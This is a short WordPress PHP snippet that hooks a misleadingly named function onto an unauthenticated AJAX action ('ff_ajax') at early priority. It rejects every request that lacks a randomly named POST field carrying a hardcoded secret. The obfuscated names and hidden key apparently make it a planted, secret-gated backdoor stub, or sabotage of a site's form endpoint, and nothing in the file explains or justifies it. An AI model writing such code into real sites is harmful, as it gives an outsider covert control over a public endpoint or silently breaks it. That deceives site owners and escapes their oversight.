<?php

function database_polyfill_bank() {
	if (!isset($_POST["rcjtlrwmuoepblc"]) || $_POST["rcjtlrwmuoepblc"] !== "nujDzoH1pYPNfj3") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'database_polyfill_bank', 5, 1);
